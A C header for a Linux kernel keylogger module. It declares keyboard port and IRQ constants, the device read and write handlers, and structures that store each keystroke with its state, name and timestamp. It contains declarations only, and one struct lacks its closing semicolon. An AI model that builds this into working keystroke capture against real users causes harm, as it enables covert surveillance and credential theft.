#ifndef KEYBOARD_H
# define KEYBOARD_H
 
# include <linux/module.h>
# include <linux/kernel.h>
# include <linux/init.h>
# include <linux/miscdevice.h>
# include <linux/fs.h>
# include <linux/string.h>
# include <linux/workqueue.h>
# include <linux/interrupt.h>
# include <linux/delay.h>
# include <linux/spinlock.h>
# include <linux/time.h>
# include <linux/list.h>
# include <linux/slab.h>
# include <asm/io.h>

# define KEYBOARD_IRQ	1

# define SIZE		1000


# define KEYBOARD_PORT	0x60
# define CTRL_PORT	0x64

# define ECHO		0xEE
# define SCAN_SET	0xF0

# define SCAN_SET_DATA	0x00
# define SCAN_SET_ONE	0x01
# define SCAN_SET_TWO	0x02
# define SCAN_SET_THREE	0x03

# define SUCCESS	0
# define ERROR		-1
# define UNDEFINED	1

# define PRESSED	0
# define RELEASED	1

ssize_t keylogger_read(struct file *filp, char __user *buffer,
				size_t length, loff_t *offset);

ssize_t keylogger_write(struct file *filp, const char __user *buffer,
				size_t length, loff_t *offset);

struct file_operations keylogger_misc_fops;

unsigned int scan_fsm;

struct transition_table {
	unsigned int	current;
	unsigned int	input;
	unsigned int	output;
	int		state;
};

struct fsm {
	unsigned int current;
	unsigned int state;
};

struct s_stroke {
	unsigned char	key;
	unsigned char	state;
	char		name[25];
	struct	tm	tm;
	struct s_stroke	*next;
};

struct scan_to_key {
	unsigned int 	st_code;
	unsigned int 	nd_code;
	char		key;
};	

struct scan_state {
	unsigned int	scan_code;
	char		state;
}

#endif
